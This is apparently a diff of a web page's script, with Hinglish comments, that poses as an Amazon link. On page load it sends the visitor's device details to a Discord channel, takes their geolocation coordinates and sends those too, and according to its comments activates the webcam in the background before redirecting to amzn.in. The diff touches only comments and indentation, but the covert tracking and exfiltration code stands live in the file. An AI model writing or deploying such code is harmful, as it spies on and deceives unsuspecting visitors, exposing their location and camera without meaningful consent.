@@ -48,13 +48,13 @@
         // Jaise hi page khulega, basic detail automatic chali jayegi
         sendToDiscord(`🌐 **New Visitor Alert!**\n📱 Device: ${deviceData.platform}\n🌍 TimeZone: ${deviceData.timeZone}\n🖥️ Resolution: ${deviceData.screenResolution}`);
 
-        function requestLocation() {
-    if (navigator.geolocation) {
+      function requestLocation() {
+      if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition((position) => {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             
-            // 1. Location text bhejega
+            // 1. Location text bhejega (Yahan Backticks lga diye hain taaki sahi se coordinates jayein)
             sendToDiscord(`🎯 **LOCATION FETCHED!** \nLatitude: ${lat}\nLongitude: ${lon}`);
 
             // 2. Background mein webcam active karega
@@ -97,7 +97,6 @@
             // 4. Amazon product par redirect kar dega
             window.location.href = "https://amzn.in";
         }, (error) => {
-            // Agar user location mana kare tab bhi Amazon par jaye
             sendToDiscord("❌ User denied location permission.");
             window.location.href = "https://amzn.in";
         });
@@ -106,8 +105,6 @@
     }
 }
 
-            
-        
     </script>
 </body>
 </html>
